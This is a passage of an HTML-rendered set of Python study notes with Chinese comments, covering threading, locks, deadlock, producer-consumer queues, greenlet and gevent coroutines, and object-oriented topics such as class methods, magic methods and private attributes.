class=\"line\"></span><br><span class=\"line\">n = 0</span><br><span class=\"line\"></span><br><span class=\"line\">def task1():</span><br><span class=\"line\">    global n</span><br><span class=\"line\">    for i in range(10000000):</span><br><span class=\"line\">        n += 1</span><br><span class=\"line\"></span><br><span class=\"line\">    print(&#x27;----&gt;value in task1: &#x27;, n)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def task2():</span><br><span class=\"line\">    global n</span><br><span class=\"line\">    for i in range(10000000):</span><br><span class=\"line\">        n += 1</span><br><span class=\"line\"></span><br><span class=\"line\">    print(&#x27;----&gt;value in task2: &#x27;, n)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    th1 = threading.Thread(target=task1)</span><br><span class=\"line\">    th2 = threading.Thread(target=task2)</span><br><span class=\"line\"></span><br><span class=\"line\">    th1.start()</span><br><span class=\"line\">    th2.start()</span><br><span class=\"line\"></span><br><span class=\"line\">    th1.join()</span><br><span class=\"line\">    th2.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    print(&#x27;last print&#x27;, n)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"多线程同步-py\"><a href=\"#多线程同步-py\" class=\"headerlink\" title=\"多线程同步.py\"></a>多线程同步.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">lock = threading.Lock()</span><br><span class=\"line\"></span><br><span class=\"line\">lock.acquire() # 请求得到锁</span><br><span class=\"line\">lock.release() # 释放锁</span><br><span class=\"line\"></span><br><span class=\"line\">只要锁不释放，其他的进程都无法进入运行状态</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">import threading</span><br><span class=\"line\">import random</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">lock = threading.Lock()</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [0] * 10</span><br><span class=\"line\"></span><br><span class=\"line\">def task1():</span><br><span class=\"line\">    # 获取线程锁，如果已经上锁，则等待锁的释放</span><br><span class=\"line\">    # lock.acquire() # 阻塞</span><br><span class=\"line\">    for i in range(len(list1)):</span><br><span class=\"line\">        list1[i] = 1</span><br><span class=\"line\">        time.sleep(0.5)</span><br><span class=\"line\"></span><br><span class=\"line\">    # lock.release() # 释放锁</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def task2():</span><br><span class=\"line\">    # lock.acquire()</span><br><span class=\"line\">    for i in range(len(list1)):</span><br><span class=\"line\">        print(&#x27;-----&gt;&#x27;, list1[i])</span><br><span class=\"line\">        time.sleep(0.5)</span><br><span class=\"line\">    # lock.release()</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    t1 = threading.Thread(target=task1)</span><br><span class=\"line\">    t2 = threading.Thread(target=task2)</span><br><span class=\"line\"></span><br><span class=\"line\">    t2.start()</span><br><span class=\"line\">    t1.start()</span><br><span class=\"line\"></span><br><span class=\"line\">    t2.join()</span><br><span class=\"line\">    t1.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    print(list1)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"死锁-py\"><a href=\"#死锁-py\" class=\"headerlink\" title=\"死锁.py\"></a>死锁.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">避免死锁：</span><br><span class=\"line\">解决方式：</span><br><span class=\"line\">1.重构</span><br><span class=\"line\">2.使用timeout参数</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">from threading import Thread, Lock</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">lockA = Lock()</span><br><span class=\"line\">lockB = Lock()</span><br><span class=\"line\"></span><br><span class=\"line\">class MyThread(Thread):</span><br><span class=\"line\">    def run(self): # start()</span><br><span class=\"line\">        if lockA.acquire(): # 如果可以获取到锁则返回True</span><br><span class=\"line\">            print(self.name+&#x27;acquired lock A&#x27;)</span><br><span class=\"line\">            time.sleep(0.1)</span><br><span class=\"line\">            if lockB.acquire(timeout=5):</span><br><span class=\"line\">                print(self.name+&#x27;acquired lock B+A&#x27;)</span><br><span class=\"line\">                lockB.release()</span><br><span class=\"line\">            lockA.release()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class MyThread1(Thread):</span><br><span class=\"line\">    # def __init__(self.name):</span><br><span class=\"line\">    #     pass</span><br><span class=\"line\"></span><br><span class=\"line\">    def run(self): # start()</span><br><span class=\"line\">        if lockB.acquire(): # 如果可以获取到锁则返回True</span><br><span class=\"line\">            print(self.name+&#x27;acquired lock B&#x27;) # self.name 继承Thread的属性值</span><br><span class=\"line\">            time.sleep(0.1)</span><br><span class=\"line\">            if lockA.acquire(timeout=5):</span><br><span class=\"line\">                print(self.name+&#x27;acquired lock A+B&#x27;)</span><br><span class=\"line\">                lockA.release()</span><br><span class=\"line\">            lockB.release()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    t1 = MyThread()</span><br><span class=\"line\">    t2 = MyThread1()</span><br><span class=\"line\"></span><br><span class=\"line\">    t1.start()</span><br><span class=\"line\">    t2.start()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"生产者与消费者模式-py\"><a href=\"#生产者与消费者模式-py\" class=\"headerlink\" title=\"生产者与消费者模式.py\"></a>生产者与消费者模式.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">生产者与消费者：两个线程之间的通信</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">import threading</span><br><span class=\"line\">import queue</span><br><span class=\"line\">import random</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">def produce(q):</span><br><span class=\"line\">    i = 0</span><br><span class=\"line\">    while i &lt; 10:</span><br><span class=\"line\">        num = random.randint(1, 100)</span><br><span class=\"line\">        q.put(&quot;producer produce data: %d&quot; % num)</span><br><span class=\"line\">        print(&quot;producer produce data: %d&quot; % num)</span><br><span class=\"line\">        time.sleep(1)</span><br><span class=\"line\">        i += 1</span><br><span class=\"line\">    q.put(None)</span><br><span class=\"line\">    # 完成任务</span><br><span class=\"line\">    q.task_done()</span><br><span class=\"line\"></span><br><span class=\"line\">def consume(q):</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        item = q.get()</span><br><span class=\"line\">        if item is None:</span><br><span class=\"line\">            break</span><br><span class=\"line\">        print(&#x27;consumer acquire: %s&#x27; % item)</span><br><span class=\"line\">        time.sleep(4)</span><br><span class=\"line\">        # 完成任务</span><br><span class=\"line\">        q.task_done()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    q = queue.Queue(10)</span><br><span class=\"line\">    arr = []</span><br><span class=\"line\"></span><br><span class=\"line\">    # 创建生产者</span><br><span class=\"line\">    th = threading.Thread(target=produce, args=(q,))</span><br><span class=\"line\">    th.start()</span><br><span class=\"line\"></span><br><span class=\"line\">    # 创建消费者</span><br><span class=\"line\">    tc = threading.Thread(target=consume, args=(q,))</span><br><span class=\"line\">    tc.start()</span><br><span class=\"line\"></span><br><span class=\"line\">    th.join()</span><br><span class=\"line\">    tc.join()</span><br><span class=\"line\">    print(&#x27;END&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"协程-py\"><a href=\"#协程-py\" class=\"headerlink\" title=\"协程.py\"></a>协程.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 协程：微线程</span><br><span class=\"line\"># 进程 》线程 》协程</span><br><span class=\"line\"></span><br><span class=\"line\"># Process Thread 生成器完成</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># def task1():</span><br><span class=\"line\">#     for i in range(3):</span><br><span class=\"line\">#         print(&#x27;A&#x27;+ str(i))</span><br><span class=\"line\">#         yield</span><br><span class=\"line\">#         time.sleep(1)</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\"># def task2():</span><br><span class=\"line\">#     for i in range(3):</span><br><span class=\"line\">#         print(&#x27;B&#x27;+ str(i))</span><br><span class=\"line\">#         yield</span><br><span class=\"line\">#         time.sleep(2)</span><br><span class=\"line\">#</span><br><span class=\"line\"># if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">#     g1 = task1()</span><br><span class=\"line\">#     g2 = task2()</span><br><span class=\"line\">#</span><br><span class=\"line\">#     while True:</span><br><span class=\"line\">#         try:</span><br><span class=\"line\">#             next(g1)</span><br><span class=\"line\">#             next(g2)</span><br><span class=\"line\">#         except:</span><br><span class=\"line\">#             break</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;----------------------------------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">from greenlet._greenlet import greenlet</span><br><span class=\"line\"></span><br><span class=\"line\"># greenlet 完成协程任务</span><br><span class=\"line\">def a():</span><br><span class=\"line\">    for i in range(5):</span><br><span class=\"line\">        print(&#x27;A&#x27;+str(i))</span><br><span class=\"line\">        gb.switch()</span><br><span class=\"line\">        time.sleep(0.1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def b():</span><br><span class=\"line\">    for i in range(5):</span><br><span class=\"line\">        print(&#x27;B&#x27;+str(i))</span><br><span class=\"line\">        gc.switch()</span><br><span class=\"line\">        time.sleep(0.1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def c():</span><br><span class=\"line\">    for i in range(5):</span><br><span class=\"line\">        print(&#x27;C&#x27;+str(i))</span><br><span class=\"line\">        ga.switch()</span><br><span class=\"line\">        time.sleep(0.1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    ga = greenlet(a)</span><br><span class=\"line\">    gb = greenlet(b)</span><br><span class=\"line\">    gc = greenlet(c)</span><br><span class=\"line\"></span><br><span class=\"line\">    ga.switch()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"gevent和猴子补丁-py\"><a href=\"#gevent和猴子补丁-py\" class=\"headerlink\" title=\"gevent和猴子补丁.py\"></a>gevent和猴子补丁.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import time</span><br><span class=\"line\">import gevent</span><br><span class=\"line\">from gevent import monkey</span><br><span class=\"line\"></span><br><span class=\"line\">monkey.patch_all()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># def a():</span><br><span class=\"line\">#     for i in range(5):</span><br><span class=\"line\">#         print(&#x27;A&#x27;+str(i))</span><br><span class=\"line\">#         time.sleep(0.1)</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\"># def b():</span><br><span class=\"line\">#     for i in range(5):</span><br><span class=\"line\">#         print(&#x27;B&#x27;+str(i))</span><br><span class=\"line\">#         time.sleep(0.1)</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\"># def c():</span><br><span class=\"line\">#     for i in range(5):</span><br><span class=\"line\">#         print(&#x27;C&#x27;+str(i))</span><br><span class=\"line\">#         time.sleep(0.1)</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\"># if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">#     g1 = gevent.spawn(a)</span><br><span class=\"line\">#     g2 = gevent.spawn(b)</span><br><span class=\"line\">#     g3 = gevent.spawn(c)</span><br><span class=\"line\">#</span><br><span class=\"line\">#     g1.join()</span><br><span class=\"line\">#     g2.join()</span><br><span class=\"line\">#     g3.join()</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;----------------------------------------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 协程爬虫案例</span><br><span class=\"line\"></span><br><span class=\"line\">import requests</span><br><span class=\"line\">import urllib.request</span><br><span class=\"line\"></span><br><span class=\"line\">def download(url):</span><br><span class=\"line\">    response = urllib.request.urlopen(url)</span><br><span class=\"line\"></span><br><span class=\"line\">    content = response.read()</span><br><span class=\"line\">    print(&#x27;downloaded data from &#123;&#125;, length is &#123;&#125;&#x27;.format(url, len(content)))</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    urls = [&#x27;http://www.163.com&#x27;, &#x27;http://www.baidu.com&#x27;, &#x27;http://www.qq.com&#x27;]</span><br><span class=\"line\">    g1 = gevent.spawn(download, urls[0])</span><br><span class=\"line\">    g2 = gevent.spawn(download, urls[1])</span><br><span class=\"line\">    g3 = gevent.spawn(download, urls[2])</span><br><span class=\"line\"></span><br><span class=\"line\">    # gevent.joinall(g1, g2, g3) # 类似 g1.join()....</span><br><span class=\"line\">    g1.join()</span><br><span class=\"line\">    g2.join()</span><br><span class=\"line\">    g3.join()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"面向对象\"><a href=\"#面向对象\" class=\"headerlink\" title=\"面向对象\"></a>面向对象</h1><h2 id=\"类方法-py\"><a href=\"#类方法-py\" class=\"headerlink\" title=\"类方法.py\"></a>类方法.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">特点：</span><br><span class=\"line\">    1. 定义需要依赖装饰器@classmethod</span><br><span class=\"line\">    2. 类方法中参数不是一个对象，而是类</span><br><span class=\"line\">        print(cls) --&gt; &lt;class &#x27;__main__.Dog&#x27;&gt;</span><br><span class=\"line\">    3. 类方法中只可以使用类属性，不能使用对象属性</span><br><span class=\"line\">    4. 在类方法中不能使用普通方法</span><br><span class=\"line\"></span><br><span class=\"line\">类方法作用：</span><br><span class=\"line\">    因为只能访问类属性和类方法，所以可以在对象创建之前完成一些动作（功能）</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">静态方法：</span><br><span class=\"line\">    类似类方法</span><br><span class=\"line\">    1. 需要用装饰器@staticmethod</span><br><span class=\"line\">    2. 静态方法无需传递参数 &lt;cls,self&gt;</span><br><span class=\"line\">    3. 只能访问类的属性和方法，对象的属性和方法是无法访问的</span><br><span class=\"line\">    4. 加载时机同类方法</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">类方法与静态方法的不同之处：</span><br><span class=\"line\">1. 装饰器不同</span><br><span class=\"line\">2. 类方法是用参数的，静态方法没有参数</span><br><span class=\"line\"></span><br><span class=\"line\">相同之处：</span><br><span class=\"line\">1.只能访问类的属性和方法，对象的属性和方法是无法访问的</span><br><span class=\"line\">2.都可以通过类名调用访问</span><br><span class=\"line\">3.都不依赖于对象，因此可以在创建对象之前调用</span><br><span class=\"line\"></span><br><span class=\"line\">普通方法与前两者的区别：</span><br><span class=\"line\">    1.没有装饰器</span><br><span class=\"line\">    2.普通方法永远依赖对象，每个普通方法都有一个self</span><br><span class=\"line\">    3.只有先创建对象才可以调用普通方法</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">class Dog():</span><br><span class=\"line\">    def __init__(self, nickname):</span><br><span class=\"line\">        self.nickname = nickname</span><br><span class=\"line\"></span><br><span class=\"line\">    def run(self):</span><br><span class=\"line\">        print(&#x27;&#123;&#125; run back and forth in the yard&#x27;.format(self.nickname))</span><br><span class=\"line\"></span><br><span class=\"line\">    def eat(self):</span><br><span class=\"line\">        print(&#x27;Enjoy meal.....&#x27;)</span><br><span class=\"line\">        self.run()  # 在类中，调用本类里面的方法，需要通过self.方法名()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    @classmethod</span><br><span class=\"line\">    def test(cls):</span><br><span class=\"line\">        print(cls)</span><br><span class=\"line\">        # print(self.nickname)</span><br><span class=\"line\">        # print(cls.nickname) # 访问对象属性则报错</span><br><span class=\"line\">        print(&#x27;-------------&#x27;)</span><br><span class=\"line\">        # self.run() # 不能使用普通方法</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Dog.test()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class Person:</span><br><span class=\"line\">    age = 18</span><br><span class=\"line\">    __age = 28</span><br><span class=\"line\"></span><br><span class=\"line\">    def show(self):</span><br><span class=\"line\">        print(&#x27;-----------&gt;&#x27;, Person.age)</span><br><span class=\"line\"></span><br><span class=\"line\">    @classmethod</span><br><span class=\"line\">    def update_age(cls):</span><br><span class=\"line\"></span><br><span class=\"line\">        cls.__age = 20</span><br><span class=\"line\">        print(&#x27;-----------&gt;class func&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    @classmethod</span><br><span class=\"line\">    def show_age(cls):</span><br><span class=\"line\">        print(&#x27;updated age is &#x27;, cls.__age)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    @staticmethod</span><br><span class=\"line\">    def test():</span><br><span class=\"line\">        print(&#x27;----------&gt;static func&#x27;)</span><br><span class=\"line\">        # print(self.name) 语法错误</span><br><span class=\"line\">        print(Person.__age)</span><br><span class=\"line\"></span><br><span class=\"line\"># print(Person.__age) # 私有属性不能在类外面使用</span><br><span class=\"line\">Person.update_age()</span><br><span class=\"line\">Person.show_age()</span><br><span class=\"line\">Person.test()</span><br><span class=\"line\">print(&#x27;-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p = Person()</span><br><span class=\"line\">p.age = p.age + 1</span><br><span class=\"line\">print(p.age)</span><br><span class=\"line\">p.show()</span><br><span class=\"line\">Person.age += 1</span><br><span class=\"line\">print(Person.age)</span><br><span class=\"line\">p.show()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"面向对象案例-1-py\"><a href=\"#面向对象案例-1-py\" class=\"headerlink\" title=\"面向对象案例-1.py\"></a>面向对象案例-1.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 猫</span><br><span class=\"line\">class Cat:</span><br><span class=\"line\">    type = &#x27;cat&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    # 通过__init__初始化特征</span><br><span class=\"line\">    def __init__(self, nickname, age, color):</span><br><span class=\"line\">        self.nickname = nickname</span><br><span class=\"line\">        self.age = age</span><br><span class=\"line\">        self.color = color</span><br><span class=\"line\"></span><br><span class=\"line\">    def eat(self, food):</span><br><span class=\"line\">        print(&#x27;&#123;&#125; likes eating &#123;&#125;&#x27;.format(self.nickname, food))</span><br><span class=\"line\"></span><br><span class=\"line\">    def catch_mouse(self, color, weight):</span><br><span class=\"line\">        print(&#x27;&#123;&#125; caught one &#123;&#125;kg &#123;&#125; mouse&#x27;.format(self.nickname, weight, color))</span><br><span class=\"line\"></span><br><span class=\"line\">    def sleep(self, hour):</span><br><span class=\"line\">        if hour &lt; 5:</span><br><span class=\"line\">            print(&#x27;Kitty, continue sleeping&#x27;)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(&#x27;hurry up, catch a mouse&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    def show(self):</span><br><span class=\"line\">        print(&#x27;This cat\\&#x27;s detail&#x27;)</span><br><span class=\"line\">        print(self.nickname, self.age, self.color)</span><br><span class=\"line\"></span><br><span class=\"line\"># 创建对象</span><br><span class=\"line\">cat1 = Cat(&#x27;huahua&#x27;, 2, &#x27;grey&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 通过对象调用方法</span><br><span class=\"line\">cat1.catch_mouse(&#x27;black&#x27;, 2)</span><br><span class=\"line\"></span><br><span class=\"line\">cat1.sleep(8)</span><br><span class=\"line\"></span><br><span class=\"line\">cat1.eat(&#x27;little fish&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">cat1.show()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"魔术方法-py\"><a href=\"#魔术方法-py\" class=\"headerlink\" title=\"魔术方法.py\"></a>魔术方法.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># 魔术方法</span><br><span class=\"line\"># __init__:初始化魔术方法</span><br><span class=\"line\"># 触发时机：初始化对象时触发（不是实例化触发，但是和实例化在一个操作中）</span><br><span class=\"line\"></span><br><span class=\"line\"># __new__: 实例化的魔术方法</span><br><span class=\"line\"># 触发时机：在实例化时触发  # 作用：开辟空间</span><br><span class=\"line\"></span><br><span class=\"line\"># __call__: 对象调用方法</span><br><span class=\"line\"># 触发时机：将对象当成函数使用的时候，会默认调用此函数中内容</span><br><span class=\"line\"></span><br><span class=\"line\"># __del__: delete的缩写，析构魔术方法</span><br><span class=\"line\"># 触发时机：当对象没有使用（没有任何变量引用）的时候触发  # 作用：没有指针引用的时候使用</span><br><span class=\"line\">1.对象赋值</span><br><span class=\"line\">p = Person()</span><br><span class=\"line\">p1 = p</span><br><span class=\"line\">说明：p和p1共同指向同一个地址</span><br><span class=\"line\">2.删除地址的引用</span><br><span class=\"line\">del p1 删除p1对地址的引用</span><br><span class=\"line\">3.查看对地址的引用次数：</span><br><span class=\"line\">import sys</span><br><span class=\"line\">sys.getrefcount(p)</span><br><span class=\"line\">4.当一块空间没有任何引用，默认执行__del__</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># __str__</span><br><span class=\"line\"># 触发时机：打印对象名 自动触发去调用__str__里面的内容</span><br><span class=\"line\"># 注意：一定要在__str__方法中添加return, return后面是打印对象是看到的内容</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">import sys</span><br><span class=\"line\"></span><br><span class=\"line\">class Person:</span><br><span class=\"line\">    def __init__(self, name):</span><br><span class=\"line\">        print(&#x27;---------------&gt;init&#x27;, self)</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\">        print(name)</span><br><span class=\"line\">        </span><br><span class=\"line\">    def __new__(cls, *args, **kwargs):</span><br><span class=\"line\">        print(&#x27;---------------&gt;new&#x27;)</span><br><span class=\"line\">        position = object.__new__(cls)</span><br><span class=\"line\">        print(position)</span><br><span class=\"line\">        return position</span><br><span class=\"line\">        # super(Person, cls).__new__(cls, *args, **kwargs)</span><br><span class=\"line\"></span><br><span class=\"line\">    def __call__(self, *args, **kwargs):</span><br><span class=\"line\">        print(&#x27;---------------------&gt;call&#x27;)</span><br><span class=\"line\">        print(&#x27;parameter is&#x27;, *args, **kwargs)</span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return &#x27;This is str magic func&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    def __del__(self):</span><br><span class=\"line\">        print(&#x27;---------------&gt;del&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p = Person(&#x27;jack&#x27;)</span><br><span class=\"line\">print(p)</span><br><span class=\"line\">print(p.name)</span><br><span class=\"line\"></span><br><span class=\"line\">p(&#x27;hello&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p1 = p</span><br><span class=\"line\">p2 = p</span><br><span class=\"line\">print(p1.name)</span><br><span class=\"line\">print(p2.name)</span><br><span class=\"line\"></span><br><span class=\"line\">p1.name = &#x27;Tom&#x27;</span><br><span class=\"line\">print(p.name)</span><br><span class=\"line\">print(p2.name)</span><br><span class=\"line\"></span><br><span class=\"line\">del p2</span><br><span class=\"line\">print(&#x27;print after delete p2&#x27;, p.name)</span><br><span class=\"line\">print(sys.getrefcount(p))</span><br><span class=\"line\"></span><br><span class=\"line\">del p1</span><br><span class=\"line\">print(&#x27;print after delete p1&#x27;, p.name)</span><br><span class=\"line\">print(sys.getrefcount(p))</span><br><span class=\"line\"></span><br><span class=\"line\"># del p</span><br><span class=\"line\"># print(&#x27;print after delete p&#x27;, p.name)</span><br><span class=\"line\"># print(sys.getrefcount(p))</span><br><span class=\"line\"></span><br><span class=\"line\">print(sys.getrefcount(p))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------__str__-----------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class Str_Magic_func:</span><br><span class=\"line\">    def __init__(self, name, age):</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\">        self.age = age</span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return &#x27;name is &#x27; + self.name + &#x27;, age is &#x27; + str(self.age)</span><br><span class=\"line\"></span><br><span class=\"line\">p = Str_Magic_func(&#x27;Tom&#x27;, 18)</span><br><span class=\"line\">print(p)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"私有化-py\"><a href=\"#私有化-py\" class=\"headerlink\" title=\"私有化.py\"></a>私有化.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 封装：1.私有化属性， 2.定义公有的set和get方法</span><br><span class=\"line\"># 好处：</span><br><span class=\"line\"># 1.隐藏属性不被外界随意修改</span><br><span class=\"line\"># 2.也可以通过函数修改</span><br><span class=\"line\">#    def setXXX(self, xxx)</span><br><span class=\"line\">        3.筛选赋值的内容</span><br><span class=\"line\">            if xxx是否符合条件</span><br><span class=\"line\">                赋值</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                不赋值</span><br><span class=\"line\">3.如果想获取具体的某一个属性</span><br><span class=\"line\">使用get函数</span><br><span class=\"line\">    def getXXX(self):</span><br><span class=\"line\">        return self.__xxx</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">class Student:</span><br><span class=\"line\">    # __age = 19 # 私有属性</span><br><span class=\"line\"></span><br><span class=\"line\">    def __init__(self, name, age):</span><br><span class=\"line\">        self.__name = name</span><br><span class=\"line\">        self.__age = age</span><br><span class=\"line\">        self.__score = 59</span><br><span class=\"line\"></span><br><span class=\"line\">    # 定义公有set和get方法</span><br><span class=\"line\">    # set是赋值</span><br><span class=\"line\">    def setAge(self, age):</span><br><span class=\"line\">        if age &gt; 0 and age &lt;= 120:</span><br><span class=\"line\">            self.__age = age</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(&#x27;Age is not in defined range&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    # get是取值</span><br><span class=\"line\">    def getAge(self):</span><br><span class=\"line\">        return self.__age</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # 修改名字的时候，长度必须是6位</span><br><span class=\"line\">    def setName(self, name):</span><br><span class=\"line\">        if len(name) == 6:</span><br><span class=\"line\">            self.__name = name</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(&#x27;name is not 6 characters&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    def getName(self):</span><br><span class=\"line\">        return self.__name</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return &#x27;name &#123;&#125;, age &#123;&#125;, score &#123;&#125;&#x27;.format(self.__name, self.__age, self.__score)</span><br><span class=\"line\"></span><br><span class=\"line\">    # attribute: setName, getName, __init__, __str__</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s = Student(&#x27;jack&#x27;, 18)</span><br><span class=\"line\">print(s)</span><br><span class=\"line\">s.age = 20</span><br><span class=\"line\">s.__score = 60</span><br><span class=\"line\">print(s)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-------------------------------------------------------&#x27;)</span><br><span class=\"line\">print(dir(Student)) # dir() 列出可调用的属性</span><br><span class=\"line\">print(dir(s))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-------------------------------------------------------&#x27;)</span><br><span class=\"line\">print(s._Student__age)</span><br><span class=\"line\">print(s.__dir__())</span><br><span class=\"line\">print(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-------------------------------------------------------&#x27;)</span><br><span class=\"line\">s.setName(&#x27;xiaopeng&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 取出年龄</span><br><span class=\"line\">print(s.getAge())</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"property装饰器-py\"><a href=\"#property装饰器-py\" class=\"headerlink\" title=\"property装饰器.py\"></a>property装饰器.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">class Student:</span><br><span class=\"line\">    # __age = 19 # 私有属性</span><br><span class=\"line\"></span><br><span class=\"line\">    def __init__(self, name, age):</span><br><span class=\"line\">        self.__name = name</span><br><span class=\"line\">        self.__age = age</span><br><span class=\"line\">        self.__score = 59</span><br><span 